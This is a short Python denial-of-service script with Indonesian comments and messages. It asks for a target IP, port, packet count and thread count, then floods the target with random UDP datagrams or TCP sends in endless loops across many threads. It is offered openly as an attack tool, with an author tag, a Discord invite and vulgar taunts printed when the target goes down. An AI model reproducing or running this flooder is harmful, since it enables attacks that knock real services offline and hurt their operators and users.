#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by Xalbador")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? PM me ")
ip = str(input(" DdosAttackByUdin | Ip:"))
port = int(input(" DdosAttackByUdin | Port:"))
choice = str(input(" DdosAttackByUdin | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByUdin | Packets:"))
threads = int(input(" DdosAttackByUdin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | ETEK BY UDIN |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" UDIN nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
